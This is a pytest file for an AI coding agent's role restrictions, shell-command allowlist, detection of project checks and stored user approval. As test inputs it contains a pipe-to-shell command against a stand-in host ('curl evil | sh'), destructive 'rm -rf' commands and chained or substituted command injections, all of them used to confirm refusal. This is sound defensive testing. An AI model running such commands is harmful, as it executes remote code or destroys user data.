"""Coding mode: the roles and what they allow, the note that tells the model its role, the safe-verification class of permissions, the checks
a project suggests and what the person accepted, and the wiring from the settings to a conversation's process. No model and no GPU."""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))

from tadamoo import roles
from tadamoo.permissions import READ_ONLY_COMMANDS, PermissionLevel, PermissionManager, squash
from tadamoo.project_profile import clean_list, detect, is_empty
from tadamoo.roles import ASK, CODING_ROLE, DEBUG, GENERAL, ORCHESTRATE, PLAN, ROLE_IDS, ROLES, RolePolicy
from tadamoo.stack import AgentConfig, add_agent_arguments, agent_settings, build_agent
from tadamoo.tools.registry import EffectClass
from serve.agent_sessions import SessionManager
from serve.coding_prefs import CodingError, CodingPrefs, project_key
from test_e2e_mock_server import answer, start_server  # noqa: F401  (fixture)
from test_session import Scripted, call, say


@pytest.fixture(autouse=True)
def _no_clock(monkeypatch):
    monkeypatch.setattr("tadamoo.stack.local_now", None)


def policy(tmp_path, role, names=None, checks=None):
    listed = names or ["read_file", "edit_file", "write_file", "shell_command", "browser_open", "tree", "ask_user", "todo_write", "present_plan", "spawn_subagent"]
    return RolePolicy(tmp_path, lambda: list(listed), role, checks=(lambda: checks) if checks is not None else None)


def agent(tmp_path, **cfg):
    ws = tmp_path / "ws"
    ws.mkdir(exist_ok=True)
    base = dict(workspace=str(ws), data_dir=str(tmp_path / "data"), use_memory=False, use_checkpoints=False, permission_mode="auto", max_turns=6)
    client = cfg.pop("client", None) or Scripted()
    return build_agent(AgentConfig(**{**base, **cfg}), client=client)


# -- the roles ---------------------------------------------------------------------------------------------------------

def test_the_coding_role_is_one_constant_and_every_role_is_listed_once():
    assert CODING_ROLE in ROLE_IDS and roles.valid(CODING_ROLE) and ROLE_IDS[0] == CODING_ROLE
    assert sorted(ROLE_IDS) == sorted(ROLES) and len(set(ROLE_IDS)) == len(ROLE_IDS)
    assert not roles.valid("nonsense") and not roles.valid(None) and not roles.valid(["build"])
    with pytest.raises(ValueError):
        policy(Path("."), "nonsense")


def test_general_has_no_limit_and_no_note_and_the_others_have_both(tmp_path):
    general = policy(tmp_path, GENERAL)
    assert general.check("browser_open", {}) == "" and general.note() == "" and general.allowed() == ["read_file", "edit_file", "write_file", "shell_command",
                                                                                                      "browser_open", "tree", "ask_user", "todo_write", "present_plan",
                                                                                                      "spawn_subagent"]
    for role in (CODING_ROLE, PLAN, ASK, DEBUG, ORCHESTRATE):
        p = policy(tmp_path, role)
        assert p.note().startswith("[harness] Role: ") and "Tools you can use in this role" in p.note()
        assert p.check("browser_open", {}), role                                       # the tools of the chat are not part of a coding role


def test_the_tools_every_role_needs_are_never_refused(tmp_path):
    for role in ROLE_IDS:
        p = policy(tmp_path, role)
        for name in roles.ALWAYS_TOOLS:
            assert p.check(name, {}) == "", (role, name)                              # plan mode and the checklist work in every role


def test_ask_cannot_write_or_run_and_the_refusal_names_what_it_can_use(tmp_path):
    p = policy(tmp_path, ASK)
    for name in ("edit_file", "write_file", "shell_command"):
        text = p.check(name, {"path": "a.py", "command": "ls"})
        assert f"'{name}' is not available in the ask role" in text and "read_file" in text and "tree" in text
    assert p.check("read_file", {"path": "a.py"}) == "" and p.check("tree", {}) == ""
    assert not p.view()["shell"] and p.view()["role"] == ASK


def test_plan_writes_only_plans_and_a_path_out_of_the_folder_is_not_one(tmp_path):
    (tmp_path / ".basalt" / "plans").mkdir(parents=True)
    p = policy(tmp_path, PLAN)
    assert p.check("write_file", {"path": ".basalt/plans/step1.md"}) == "" and p.check("edit_file", {"path": ".basalt\\plans\\step1.md"}) == ""
    assert p.check("write_file", {"path": str(tmp_path / ".basalt" / "plans" / "x.md")}) == ""        # an absolute path inside the folder is the same
    for bad in ("src/app.py", ".basalt/plans/sub/x.md", ".basalt/plans/x.py", "../escape.md", ".basalt/plans/../../x.md", "plans.md"):
        text = p.check("write_file", {"path": bad})
        assert ".basalt/plans/*.md" in text and "outside" in text, bad
    assert "shell_command" not in roles.ROLES[PLAN].tools                                               # no commands in a planning role
    assert p.check("shell_command", {"command": "ls"}) and "You may write only .basalt/plans/*.md." in p.note()


def test_build_and_debug_edit_and_run_and_orchestrate_hands_work_to_subagents(tmp_path):
    for role in (CODING_ROLE, DEBUG):
        p = policy(tmp_path, role)
        assert p.check("edit_file", {"path": "src/a.py"}) == "" and p.check("shell_command", {"command": "pytest"}) == "" and p.check("spawn_subagent", {})
    o = policy(tmp_path, ORCHESTRATE)
    assert o.check("spawn_subagent", {}) == "" and o.check("edit_file", {"path": "a.py"}) and o.check("shell_command", {"command": "ls"})
    assert "Debug protocol" not in roles.ROLES[DEBUG].text and "Confirm the cause" in roles.ROLES[DEBUG].text


def test_a_note_is_short_and_the_same_every_time_and_shows_the_approved_checks(tmp_path):
    for role in ROLE_IDS:
        assert roles.note_tokens(policy(tmp_path, role).note()) <= roles.MAX_NOTE_TOKENS, role
    p = policy(tmp_path, CODING_ROLE, checks=["python -m pytest -x -q", "python -m ruff check ."])
    assert p.note() == p.note() and "`python -m pytest -x -q`" in p.note() and "run without asking" in p.note()
    assert "approved these commands" not in policy(tmp_path, ASK, checks=["pytest"]).note()         # a role with no shell is not told about commands
    many = policy(tmp_path, CODING_ROLE, checks=[f"cmd{i}" for i in range(9)]).note()
    assert "and 3 more" in many


# -- the role in a running conversation --------------------------------------------------------------------------------

def run(built, goal):
    built.agent.run(goal)
    return built.agent


def test_the_request_ends_with_the_role_note_which_is_never_kept_and_the_prefix_never_changes(tmp_path):
    client = Scripted(say("one"), say("two"), say("three"))
    built = agent(tmp_path, client=client, role=CODING_ROLE)
    try:
        listed = json.dumps(built.agent.tools.schemas(), sort_keys=True)
        system = built.agent.messages[0]["content"]
        run(built, "hello")
        last = client.sent[0][-1]
        assert last["role"] == "user" and last["content"].startswith("[harness] Role: build") and client.sent[0][-2]["content"] == "hello"
        assert not any("Role: build" in str(m.get("content")) for m in built.agent.messages)           # not stored
        built.set_role(PLAN)
        run(built, "again")
        assert client.sent[1][-1]["content"].startswith("[harness] Role: plan")
        built.set_role(GENERAL)
        run(built, "third")
        assert all("[harness] Role:" not in str(m.get("content")) for m in client.sent[2])             # general adds nothing at all
        assert json.dumps(built.agent.tools.schemas(), sort_keys=True) == listed and built.agent.messages[0]["content"] == system
        before = [m["content"] for m in client.sent[0][:-1]]
        assert [m["content"] for m in client.sent[1][:len(before)]] == before                          # the start of the request is the same after a switch
    finally:
        built.close()


def test_a_call_outside_the_role_is_refused_with_the_tools_it_has_and_runs_nothing(tmp_path):
    (tmp_path / "ws").mkdir()
    (tmp_path / "ws" / "a.txt").write_text("keep", encoding="utf-8")
    client = Scripted(call("edit_file", path="a.txt", target="keep", replacement="lost"), say("done"))
    built = agent(tmp_path, client=client, role=ASK)
    try:
        run(built, "change it")
        assert (tmp_path / "ws" / "a.txt").read_text(encoding="utf-8") == "keep"
        refusal = next(m for m in built.agent.messages if m.get("role") == "tool")["content"]
        assert "not available in the ask role" in refusal and "read_file" in refusal
        assert built.agent.permissions.denied == 0                                  # the role refused it before the permission layer was asked
    finally:
        built.close()


def test_the_plan_role_can_write_a_plan_and_nothing_else(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    client = Scripted(call("write_file", path=".basalt/plans/p.md", content="# plan\n"), call("write_file", path="app.py", content="x = 1\n"), say("done"))
    built = agent(tmp_path, client=client, role=PLAN)
    try:
        run(built, "plan it")
        assert (ws / ".basalt" / "plans" / "p.md").read_text(encoding="utf-8") == "# plan\n" and not (ws / "app.py").exists()
        outcomes = [m["content"] for m in built.agent.messages if m.get("role") == "tool"]
        assert "may change only .basalt/plans/*.md" in outcomes[1]
    finally:
        built.close()


def test_plan_mode_still_ends_with_present_plan_in_a_coding_role(tmp_path):
    built = agent(tmp_path, role=CODING_ROLE, permission_mode="plan")
    try:
        assert built.role.check("present_plan", {"plan": "x"}) == ""
        built.agent.tools.get("present_plan")
    finally:
        built.close()


def test_a_bad_role_is_an_error_and_the_options_and_defaults_are_there(tmp_path):
    with pytest.raises(ValueError, match="role"):
        agent(tmp_path, role="king")
    parser = argparse.ArgumentParser()
    add_agent_arguments(parser)
    assert agent_settings(parser.parse_args([]))["role"] == GENERAL and agent_settings(parser.parse_args([]))["safe_commands"] == []
    given = agent_settings(parser.parse_args(["--role", "build", "--safe-command", "pytest -q", "--project-check", "ruff check ."]))
    assert given["role"] == "build" and given["safe_commands"] == ["pytest -q"] and given["project_checks"] == ["ruff check ."]
    with pytest.raises(SystemExit):
        parser.parse_args(["--role", "king"])
    built = agent(tmp_path)
    try:
        with pytest.raises(ValueError):
            built.set_role("king")
        assert built.role.id == GENERAL
    finally:
        built.close()


def test_a_fork_keeps_the_role_and_the_tools_slash_command_shows_what_it_allows(tmp_path):
    from tadamoo import commands
    from test_commands import make
    session, ev, built = make(tmp_path, Scripted(say("ok")))
    built.set_role(ASK)
    assert built.agent.fork().role is built.role
    listed = commands.run("tools", "", session)["data"]
    by = {t["name"]: t["role_allowed"] for t in listed["tools"]}
    assert listed["role"] == ASK and by["read_file"] is True and by["edit_file"] is False and by["shell_command"] is False
    assert commands.run("status", "", session)["data"]["role"] == ASK


# -- safe verification --------------------------------------------------------------------------------------------------

def manager(level=PermissionLevel.DEFAULT, asked=None, **kw):
    pm = PermissionManager(level=level, confirm_callback=(lambda tool, args: asked.append(args["command"]) or False) if asked is not None else None, **kw)
    pm.safe_commands = ["python -m pytest -x -q", "ruff check ."]
    return pm


def ask(pm, command):
    return pm.evaluate("shell_command", EffectClass.IRREVERSIBLE, {"command": command})


def test_a_listed_command_runs_without_a_question_and_anything_else_asks():
    asked = []
    pm = manager(asked=asked)
    allowed, why = ask(pm, "python -m pytest -x -q")
    assert allowed and "safe verification" in why and asked == []
    assert ask(pm, "python  -m   pytest -x -q")[0] and asked == []                                 # spacing outside quotes does not matter
    for other in ("python -m pytest", "python -m pytest -x -q tests/test_a.py", "pytest -x -q", "python -m pytest -x -q > out.txt", "rm -rf build"):
        assert not ask(pm, other)[0], other
    assert asked.count("rm -rf build") == 1 and len(asked) == 5                                    # each was put to the person, not run


def test_a_chain_is_covered_only_when_every_statement_is_listed():
    asked = []
    pm = manager(asked=asked)
    assert ask(pm, "ruff check . && python -m pytest -x -q")[0] and ask(pm, "ruff check . ; ruff check .")[0]
    assert not ask(pm, "ruff check . && rm -rf x")[0] and not ask(pm, "python -m pytest -x -q | tail")[0] and not ask(pm, "ruff check . $(rm x)")[0]
    assert len(asked) == 3


def test_a_command_listed_with_its_chain_is_covered_whole_and_its_parts_alone_are_not():
    pm = manager(asked=[])
    pm.safe_commands = ["ruff check . && python -m pytest -x -q"]
    assert ask(pm, "ruff check . && python -m pytest -x -q")[0]
    assert not ask(pm, "python -m pytest -x -q")[0] and not ask(pm, "ruff check .")[0]


def test_quotes_keep_their_spacing_and_a_newline_is_a_second_statement():
    pm = manager(asked=[])
    pm.safe_commands = ['pytest -k "a  b"', "pytest"]
    assert ask(pm, 'pytest   -k "a  b"')[0] and not ask(pm, 'pytest -k "a b"')[0] and not ask(pm, "pytest\nrm x")[0]
    assert squash("  a \t b  ") == "a b" and squash('x "a  b"  y') == 'x "a  b" y'


def test_a_deny_rule_and_plan_mode_come_before_safe_verification():
    pm = manager(asked=[])
    pm.add_rule("shell_command:ruff *", "deny")
    allowed, why = ask(pm, "ruff check .")
    assert not allowed and "denied by rule" in why
    assert ask(pm, "python -m pytest -x -q")[0]
    planning = manager(asked=[], plan_mode=True)
    allowed, why = ask(planning, "python -m pytest -x -q")
    assert not allowed and "Plan mode" in why


def test_safe_verification_works_at_the_read_only_level_and_changes_nothing_at_auto():
    assert ask(manager(PermissionLevel.READ_ONLY, asked=[]), "ruff check .")[0]
    assert not ask(manager(PermissionLevel.READ_ONLY, asked=[]), "ruff check . -x")[0]
    assert ask(manager(PermissionLevel.AUTO), "rm -rf x")[0]


def test_the_read_only_list_is_on_only_in_a_coding_role_and_is_matched_whole():
    pm = PermissionManager(level=PermissionLevel.DEFAULT, confirm_callback=lambda t, a: False)
    assert not ask(pm, "git status")[0]
    pm.read_only_class = True
    for command in READ_ONLY_COMMANDS:
        assert ask(pm, command)[0], command
    for command in ("git status; rm x", "git push", "git log -p --output=x", "ls /etc"):
        assert not ask(pm, command)[0], command
    assert pm.safe_verification("shell_command", {"command": "git status && ls"}) == "git status, ls"


def test_the_refusal_lists_the_exact_commands_that_can_run_and_other_tools_are_unaffected():
    pm = manager(asked=None)
    allowed, why = ask(pm, "make all")
    assert not allowed and "python -m pytest -x -q" in why and "each written as listed" in why
    assert pm.safe_verification("read_file", {"command": "python -m pytest -x -q"}) == ""


def test_a_built_agent_takes_the_listed_commands_and_the_role_sets_the_read_only_class(tmp_path):
    built = agent(tmp_path, permission_mode="default", safe_commands=["pytest -q", "pytest -q", " "], role=CODING_ROLE)
    try:
        assert built.permissions.safe_commands == ["pytest -q"] and built.permissions.read_only_class is True
        built.set_role(GENERAL)
        assert built.permissions.read_only_class is False
        built.set_role(ASK)
        assert built.permissions.read_only_class is False                              # a role with no shell has no use for it
        built.set_role(DEBUG)
        assert built.permissions.read_only_class is True
    finally:
        built.close()


# -- the checks a project suggests -------------------------------------------------------------------------------------

def put(folder, name, text):
    path = folder / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def commands(folder):
    return {c.command: c.kind for c in detect(folder)}


def test_python_node_rust_go_make_and_cmake_projects_are_read_without_running_anything(tmp_path):
    py = tmp_path / "py"
    put(py, "pyproject.toml", "[tool.pytest.ini_options]\naddopts='-q'\n[tool.ruff]\nline-length=100\n[tool.mypy]\nstrict=true\n")
    assert commands(py) == {"python -m pytest -x -q": "test", "python -m ruff check .": "lint", "python -m mypy .": "typecheck"}
    bare = tmp_path / "bare"
    put(bare, "pyproject.toml", "[project]\nname='x'\n")
    assert commands(bare) == {}
    put(bare, "tests/test_a.py", "def test_a(): pass\n")
    assert commands(bare) == {"python -m pytest -x -q": "test"}
    node = tmp_path / "node"
    put(node, "package.json", json.dumps({"scripts": {"test": "jest --coverage", "lint": "eslint .", "build": "tsc -p .", "start": "node ."}}))
    found = {c.command: c for c in detect(node)}
    assert set(found) == {"npm test", "npm run lint", "npm run build"} and found["npm test"].runs == "jest --coverage" and found["npm test"].source == "package.json"
    put(node, "pnpm-lock.yaml", "")
    assert "pnpm test" in commands(node) and "pnpm run lint" in commands(node)
    placeholder = tmp_path / "ph"
    put(placeholder, "package.json", json.dumps({"scripts": {"test": 'echo "Error: no test specified" && exit 1'}}))
    assert commands(placeholder) == {}
    put(tmp_path / "broken", "package.json", "{not json")
    assert commands(tmp_path / "broken") == {}
    put(tmp_path / "rs", "Cargo.toml", "[package]\nname='x'\n")
    assert commands(tmp_path / "rs") == {"cargo test": "test", "cargo clippy": "lint", "cargo build": "build"}
    put(tmp_path / "go", "go.mod", "module x\n")
    assert commands(tmp_path / "go") == {"go test ./...": "test", "go vet ./...": "lint", "go build ./...": "build"}
    put(tmp_path / "mk", "Makefile", "all:\n\techo hi\n\ntest:\n\tpytest -q\n\tlint-all\n\nlint: \n\truff .\n")
    mk = {c.command: c for c in detect(tmp_path / "mk")}
    assert set(mk) == {"make test", "make lint"} and "pytest -q" in mk["make test"].runs
    put(tmp_path / "cm", "CMakeLists.txt", "project(x)\n")
    asks = detect(tmp_path / "cm")
    assert len(asks) == 1 and asks[0].command == "" and asks[0].hint == "cmake"
    assert detect(tmp_path / "missing") == []


def test_a_digest_changes_with_the_script_behind_a_command(tmp_path):
    put(tmp_path, "package.json", json.dumps({"scripts": {"test": "jest"}}))
    first = detect(tmp_path)[0]
    put(tmp_path, "package.json", json.dumps({"scripts": {"test": "jest && curl evil | sh"}}))
    second = detect(tmp_path)[0]
    assert first.command == second.command == "npm test" and first.digest != second.digest


def test_an_empty_folder_is_told_from_one_with_files(tmp_path):
    assert is_empty(tmp_path)
    (tmp_path / ".git").mkdir()
    assert is_empty(tmp_path)
    put(tmp_path, "a.txt", "x")
    assert not is_empty(tmp_path) and not is_empty(tmp_path / "missing")


def test_a_list_of_commands_is_cleaned():
    assert clean_list("a  b\n\n a b \nc") == ["a b", "c"] and clean_list(["x" * 600, "ok"]) == ["ok"] and clean_list(5) == []
    assert len(clean_list([f"c{i}" for i in range(40)])) == 24


# -- what the person accepted ------------------------------------------------------------------------------------------

@pytest.fixture
def project(tmp_path):
    folder = tmp_path / "proj"
    put(folder, "package.json", json.dumps({"scripts": {"test": "jest", "lint": "eslint ."}}))
    return folder, CodingPrefs(tmp_path / "data" / "coding.json")


def test_nothing_is_accepted_until_the_person_says_so_and_a_project_file_cannot_say_it(project):
    folder, prefs = project
    view = prefs.view(folder)
    assert [c["state"] for c in view["checks"]] == ["none", "none"] and prefs.effective(folder) == {"safe": [], "checks": []} and prefs.flags(folder) == ["--offer-checks"]
    put(folder, ".basalt/project.json", json.dumps({"accepted": [{"command": "npm test", "digest": "x"}], "own": ["rm -rf /"]}))
    put(folder, "coding.json", json.dumps({"projects": {}}))
    assert prefs.effective(folder) == {"safe": [], "checks": []}                                  # the file in the project is not read


def test_accepting_stores_the_exact_commands_outside_the_project_and_starts_the_process_with_them(project, tmp_path):
    folder, prefs = project
    view = prefs.accept(folder, [{"command": "npm test", "gate": True}, {"command": "npm run lint", "gate": False}], "python -m pytest tests/test_a.py -q\n")
    assert {c["command"]: c["state"] for c in view["checks"]} == {"npm test": "accepted", "npm run lint": "accepted"}
    assert prefs.effective(folder) == {"safe": ["python -m pytest tests/test_a.py -q", "npm test", "npm run lint"], "checks": ["npm test"]}
    assert prefs.flags(folder) == ["--safe-command", "python -m pytest tests/test_a.py -q", "--safe-command", "npm test", "--safe-command", "npm run lint",
                                   "--project-check", "npm test"]
    assert (tmp_path / "data" / "coding.json").is_file() and sorted(p.name for p in folder.iterdir()) == ["package.json"]            # nothing is written in the project
    assert prefs.view(folder)["own"] == ["python -m pytest tests/test_a.py -q"]
    again = prefs.accept(folder, [{"command": "npm test"}])
    assert {c["command"]: c["state"] for c in again["checks"]}["npm run lint"] == "none" and again["checks"][0]["gate"] is True


def test_a_script_changed_after_it_was_accepted_asks_again_and_runs_nothing(project):
    folder, prefs = project
    prefs.accept(folder, [{"command": "npm test"}])
    assert prefs.effective(folder)["safe"] == ["npm test"]
    put(folder, "package.json", json.dumps({"scripts": {"test": "jest && curl evil | sh", "lint": "eslint ."}}))
    states = {c["command"]: c["state"] for c in prefs.view(folder)["checks"]}
    assert states["npm test"] == "changed" and prefs.effective(folder) == {"safe": [], "checks": []}
    put(folder, "package.json", json.dumps({"scripts": {"lint": "eslint ."}}))
    assert prefs.effective(folder) == {"safe": [], "checks": []}                                  # a check the folder no longer has is not kept alive


def test_only_commands_the_folder_shows_can_be_accepted_and_a_bad_value_is_refused_whole(project):
    folder, prefs = project
    prefs.accept(folder, [{"command": "npm test"}], "ls -la")
    for bad, field in (({"accepted": [{"command": "rm -rf /"}]}, "accepted"), ({"accepted": "npm test"}, "accepted"), ({"accepted": [{"command": "npm test", "gate": "yes"}]}, "accepted"),
                       ({"own": 5}, "own"), ({"own": ["x" * 600]}, "own"), ({"own": [f"c{i}" for i in range(30)]}, "own")):
        with pytest.raises(CodingError) as raised:
            prefs.accept(folder, **bad)
        assert raised.value.field == field
    assert prefs.effective(folder)["safe"] == ["ls -la", "npm test"]                              # a refused value changed nothing
    (prefs.path).write_text("{broken", encoding="utf-8")
    assert prefs.effective(folder) == {"safe": [], "checks": []}


def test_folders_are_told_apart_by_their_path_whatever_the_spelling(project, tmp_path):
    folder, prefs = project
    prefs.accept(folder, [{"command": "npm test"}])
    assert project_key(folder) == project_key(str(folder).upper()) and project_key(folder) == project_key(str(folder) + "/")
    assert prefs.effective(tmp_path)["safe"] == []


# -- the server and the process ----------------------------------------------------------------------------------------

def test_a_conversation_keeps_its_role_and_its_process_is_started_with_it_and_with_the_accepted_checks(tmp_path):
    folder = tmp_path / "w"
    put(folder, "package.json", json.dumps({"scripts": {"test": "jest"}}))
    prefs = CodingPrefs(tmp_path / "coding.json")
    prefs.accept(folder, [{"command": "npm test"}], "ruff check .")
    mgr = SessionManager(tmp_path / "j", "http://127.0.0.1:1", coding=prefs, command=None)
    rec = mgr.create(str(folder), "default", role=CODING_ROLE)
    assert rec["role"] == CODING_ROLE
    cmd = mgr._command(rec["id"], mgr._record(rec["id"]), tmp_path / "h")
    assert cmd[cmd.index("--role") + 1] == CODING_ROLE
    assert [cmd[i + 1] for i, x in enumerate(cmd) if x == "--safe-command"] == ["ruff check .", "npm test"] and cmd[cmd.index("--project-check") + 1] == "npm test"
    plain = mgr.create(str(folder), "default")
    assert plain["role"] == GENERAL and "--role" not in mgr._command(plain["id"], mgr._record(plain["id"]), tmp_path / "h")
    asked = mgr.create(str(folder), "default", ask_only=True, role=CODING_ROLE)
    ask_cmd = mgr._command(asked["id"], mgr._record(asked["id"]), tmp_path / "h")
    assert "--role" not in ask_cmd and "--safe-command" not in ask_cmd                              # a conversation without tools has neither
    from serve.agent_runs import RunError
    with pytest.raises(RunError) as bad:
        mgr.create(str(folder), "default", role="king")
    assert bad.value.code == "bad_role"


def test_switching_the_role_is_recorded_pushed_and_refused_for_a_closed_or_toolless_conversation(tmp_path):
    folder = tmp_path / "w"
    folder.mkdir()
    mgr = SessionManager(tmp_path / "j", "http://127.0.0.1:1", command=None)
    sid = mgr.create(str(folder), "default")["id"]
    assert mgr.set_role(sid, PLAN)["role"] == PLAN
    from serve.agent_runs import RunError
    with pytest.raises(RunError):
        mgr.set_role(sid, "king")
    only = mgr.create(str(folder), "default", ask_only=True)["id"]
    with pytest.raises(RunError):
        mgr.set_role(only, ASK)


def test_the_running_process_takes_a_role_and_new_checks_and_says_so(tmp_path, monkeypatch):
    import io
    import threading
    import time
    import tadamoo.session as hs
    from test_commands import Feed
    ws = tmp_path / "ws"
    ws.mkdir()
    real = hs.build_agent
    monkeypatch.setattr(hs, "build_agent", lambda cfg, client=None, summarizer=None, technical=None, _c=Scripted(): real(cfg, client=_c))
    feed, out = Feed(), io.StringIO()
    t = threading.Thread(target=lambda: hs.main(["--workspace", str(ws), "--history-dir", str(tmp_path / "h"), "--session-id", "t1", "--no-memory", "--no-checkpoints",
                                                 "--heartbeat", "0.05", "--role", "build", "--safe-command", "ruff check ."], stdin=feed, stdout=out), daemon=True)
    t.start()

    def seen(pred):
        return [e for e in (json.loads(line) for line in out.getvalue().splitlines()) if pred(e)]

    def status(cid):
        feed.put({"cmd": "command", "id": cid, "name": "status", "args": ""})
        end = time.monotonic() + 10
        while not seen(lambda e: e["event"] == "command" and e["id"] == cid) and time.monotonic() < end:
            time.sleep(0.05)
        return seen(lambda e: e["event"] == "command" and e["id"] == cid)[0]["data"]
    assert status("a")["role"] == "build"
    feed.put({"cmd": "role", "role": "ask"})
    feed.put({"cmd": "role", "role": "king"})
    feed.put({"cmd": "checks", "safe": ["pytest -q", "npm test"], "checks": ["npm test"]})
    assert status("b")["role"] == "ask"
    feed.put({"cmd": "close"})
    t.join(10)
    assert seen(lambda e: e["event"] == "role") == [{"event": "role", "role": "ask"}]
    assert seen(lambda e: e["event"] == "checks") == [{"event": "checks", "safe": 2, "checks": 1}]
    assert len(seen(lambda e: e.get("code") == "bad_command")) == 1


def test_new_accepted_checks_reach_the_gate_of_a_running_conversation(tmp_path):
    built = agent(tmp_path, verify_gate="always", verify_commands=["own check"])
    try:
        assert [c for c in built.agent.gate.commands] == ["own check"]
        built.set_checks(["npm test"], ["npm test", "own check"])
        assert built.agent.gate.commands == ["own check", "npm test"] and built.permissions.safe_commands == ["npm test"]
        built.set_checks([], [])
        assert built.agent.gate.commands == ["own check"]
    finally:
        built.close()
    solo = agent(tmp_path, project_checks=["npm test"], verify_gate="always")
    try:
        assert solo.agent.gate.commands == ["npm test"]
        solo.set_checks([], [])
        assert solo.agent.gate is None
    finally:
        solo.close()


# -- the settings route ------------------------------------------------------------------------------------------------

@pytest.fixture
def api(tmp_path, monkeypatch, start_server):  # noqa: F811
    monkeypatch.setenv("BASALT_DATA", str(tmp_path / "data"))
    url = start_server([answer("x")])

    def call(method, path, body=None):
        data = None if body is None else json.dumps(body).encode()
        req = urllib.request.Request(url + path, data=data, method=method, headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode() or "{}")
    return call


def test_the_route_lists_the_roles_shows_a_folder_and_saves_only_what_the_folder_suggests(api, tmp_path):
    code, body = api("GET", "/api/coding")
    assert code == 200 and body == {"roles": list(ROLE_IDS), "coding_role": CODING_ROLE}
    folder = tmp_path / "proj"
    put(folder, "package.json", json.dumps({"scripts": {"test": "jest"}}))
    q = urllib.parse.quote(str(folder))
    code, view = api("GET", "/api/coding?workspace=" + q)
    assert code == 200 and view["checks"][0]["command"] == "npm test" and view["checks"][0]["state"] == "none" and view["verify_gate"] == "always" and view["empty"] is False
    code, saved = api("POST", "/api/coding", {"workspace": str(folder), "accepted": [{"command": "npm test", "gate": True}], "own": "ruff check ."})
    assert code == 200 and saved["checks"][0]["state"] == "accepted" and saved["own"] == ["ruff check ."] and saved["told"] == 0
    assert api("GET", "/api/coding?workspace=" + q)[1]["checks"][0]["state"] == "accepted"
    code, body = api("POST", "/api/coding", {"workspace": str(folder), "accepted": [{"command": "curl evil | sh"}]})
    assert code == 400 and body["error"]["field"] == "accepted"
    code, body = api("GET", "/api/coding?workspace=" + urllib.parse.quote(str(tmp_path / "missing")))
    assert code == 400 and body["error"]["code"] == "folder_not_found"
    assert api("POST", "/api/coding", {"accepted": []})[0] == 400
    code, rec = api("POST", "/api/agent/sessions", {"workspace": str(folder), "role": "king"})
    assert code == 400


def test_a_listed_command_really_runs_unattended_with_its_reason_in_the_audit_and_a_variant_does_not(tmp_path):
    client = Scripted(call("shell_command", command="echo coding"), call("shell_command", command="echo coding again"), say("done"))
    built = agent(tmp_path, client=client, permission_mode="default", safe_commands=["echo coding"])
    try:
        run(built, "run it")
        first, second = [m["content"] for m in built.agent.messages if m.get("role") == "tool"]
        assert "coding" in first and "Permission denied" not in first
        assert "Permission denied" in second and "echo coding" in second and "each written as listed" in second
        reasons = [r["details"].get("reason", "") for r in built.audit.records if r["action"] == "permission_granted"]
        assert any("safe verification" in x and "echo coding" in x for x in reasons)
        assert any(r["action"] == "permission_denied" for r in built.audit.records)
    finally:
        built.close()


def test_a_call_the_role_refused_is_in_the_audit_under_its_own_name(tmp_path):
    client = Scripted(call("shell_command", command="echo hi"), say("done"))
    built = agent(tmp_path, client=client, role=ASK)
    try:
        run(built, "go")
        assert [r["action"] for r in built.audit.records if r["action"].startswith("role")] == ["role_denied"]
    finally:
        built.close()
